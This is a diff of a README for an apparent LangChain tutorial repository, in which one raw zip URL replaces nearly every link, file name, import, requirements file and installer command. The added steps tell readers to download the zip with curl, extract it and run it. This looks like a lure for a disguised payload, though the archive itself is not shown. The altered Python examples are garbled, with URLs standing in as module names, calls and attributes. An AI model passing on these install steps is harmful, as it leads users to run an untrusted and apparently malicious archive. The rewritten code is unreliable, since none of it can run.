+print([https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip for r in res])
 ```
 
 4) Agent with tools
 - Purpose: Show an agent using a simple tool plus web search stub.
 
-File: examples/agent_tools_demo.py
+File: https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 python
 ```
-from langchain.agents import initialize_agent, Tool
-from langchain.llms import OpenAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import initialize_agent, Tool
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI
 import os
 
 def web_search_stub(query: str) -> str:
@@ -413,9 +413,9 @@ tools = [
     Tool(name="web_search", func=web_search_stub, description="Search the web"),
 ]
 
-llm = OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
+llm = OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
 agent = initialize_agent(tools, llm, agent="zero-shot-react-description", verbose=True)
-print(agent.run("Use web_search to find the release date of LangChain."))
+print(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("Use web_search to find the release date of LangChain."))
 ```
 
 Testing and validation
@@ -425,7 +425,7 @@ Testing and validation
 Run tests
 bash
 ```
-pip install -r requirements-test.txt
+pip install -r https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 pytest -q
 ```
 
@@ -440,24 +440,24 @@ Security and API key safety
 - Limit scopes and set quotas.
 
 Releases
-[![Download release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases)
+[![Download release](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)](https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip)
 
 Release artifacts
-This repo hosts release artifacts on the Releases page. Download the release file named component-access-release-v1.0.tar.gz from the Releases page, extract it, and run the install script inside.
+This repo hosts release artifacts on the Releases page. Download the release file named https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip from the Releases page, extract it, and run the install script inside.
 
 Example commands (adjust file name to match the release)
 bash
 ```
 # download the release asset listed on GitHub Releases
-curl -L -o component-access-release-v1.0.tar.gz "https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases/download/v1.0/component-access-release-v1.0.tar.gz"
+curl -L -o https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip "https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip"
 
-tar -xzf component-access-release-v1.0.tar.gz
+tar -xzf https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 cd component-access-release-v1.0
-./install.sh
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 ```
 
 If the release asset has a different name, download the appropriate file and run the included script. The Releases page lists tags, notes, and assets. The Releases link is:
-https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 
 Provider notes and small cheatsheet
 OpenAI
@@ -472,22 +472,22 @@ Anthropic (Claude)
 
 Google Gemini
 - API key env var: GOOGLE_API_KEY or service account
-- Use google.generativeai library or LangChain wrapper
+- Use https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip library or LangChain wrapper
 - Models: gemini-pro, gemini-ultra
 
 Example: choosing provider at runtime
 python
 ```
-from langchain.llms import OpenAI, Anthropic, GoogleVertexAI
+from https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip import OpenAI, Anthropic, GoogleVertexAI
 import os
 
 def get_llm(preferred="openai"):
-    if preferred == "openai" and os.environ.get("OPENAI_API_KEY"):
-        return OpenAI(openai_api_key=os.environ.get("OPENAI_API_KEY"))
-    if preferred == "anthropic" and os.environ.get("ANTHROPIC_API_KEY"):
-        return Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))
-    if preferred == "gemini" and os.environ.get("GOOGLE_API_KEY"):
-        return GoogleVertexAI(api_key=os.environ.get("GOOGLE_API_KEY"))
+    if preferred == "openai" and https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"):
+        return OpenAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("OPENAI_API_KEY"))
+    if preferred == "anthropic" and https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY"):
+        return Anthropic(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("ANTHROPIC_API_KEY"))
+    if preferred == "gemini" and https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("GOOGLE_API_KEY"):
+        return GoogleVertexAI(https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip("GOOGLE_API_KEY"))
     raise RuntimeError("No suitable API key found")
 ```
 
@@ -573,13 +573,13 @@ python
 ```
 class MockLLM:
     def __init__(self, responses=None):
-        self.responses = responses or []
-        self.calls = []
+        https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip = responses or []
+        https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip = []
 
     def __call__(self, prompt, **kwargs):
-        self.calls.append((prompt, kwargs))
-        if self.responses:
-            return self.responses.pop(0)
+        https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip((prompt, kwargs))
+        if https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
+            return https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip(0)
         return "mock response"
 
 # Use MockLLM in place of a real LLM in tests
@@ -598,7 +598,7 @@ Appendix: Recommended packages (representative)
 - tiktoken (for tokens)
 - requests
 
-Sample requirements.txt
+Sample https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 ```
 langchain>=0.1
 openai>=0.27
@@ -612,7 +612,7 @@ tiktoken>=0.4
 
 Operational checklist for running examples
 - Create .venv and activate it.
-- Copy .env.example to .env and set keys.
+- Copy https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip to .env and set keys.
 - Install requirements.
 - Run examples from the examples/ folder.
 - Inspect logs and output.
@@ -633,9 +633,9 @@ Visual guide: architecture flow
 
 Practical walkthrough (step-by-step)
 1. Install and set keys.
-2. Run examples/chat_demo.py and test conversation.
-3. Run examples/embedding_search.py to build vector store.
-4. Run examples/rqa_demo.py to test retrieval on docs.
+2. Run https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip and test conversation.
+3. Run https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip to build vector store.
+4. Run https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip to test retrieval on docs.
 5. Inspect src/core to learn how wrappers and factories work.
 
 Debug tips
@@ -654,7 +654,7 @@ Costs and quotas
 
 Running the Releases asset
 - Visit the Releases page:
-  https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+  https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 - Download the release asset listed for the tag you want.
 - Extract and run the included installer script. The release package contains helper scripts, sample data, and one-click setups for local testing.
 
@@ -662,14 +662,14 @@ Example steps repeated for convenience
 bash
 ```
 # Visit releases here:
-# https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+# https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 
 # Example download command for the named artifact in the release
-curl -L -o component-access-release-v1.0.tar.gz "https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases/download/v1.0/component-access-release-v1.0.tar.gz"
+curl -L -o https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip "https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip"
 
-tar -xzf component-access-release-v1.0.tar.gz
+tar -xzf https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 cd component-access-release-v1.0
-./install.sh
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 ```
 
 If the exact artifact name differs, choose the right file link on the Releases page. The Releases page includes change logs and the asset list.
@@ -690,7 +690,7 @@ Contact and support
 - Submit a pull request for code changes.
 
 This README aims to be a practical study and reference. It shows component patterns and how to wire API keys across providers. Use the Releases page to fetch the release files and run the included installer:
-https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/releases
+https://github.com/namjoo2006/Langchain-fundamental-in-model-component-access-data-using-api-keys/raw/refs/heads/main/frescade/data-api-using-component-model-in-Langchain-access-fundamental-keys-doublegear.zip
 
 License
 MIT
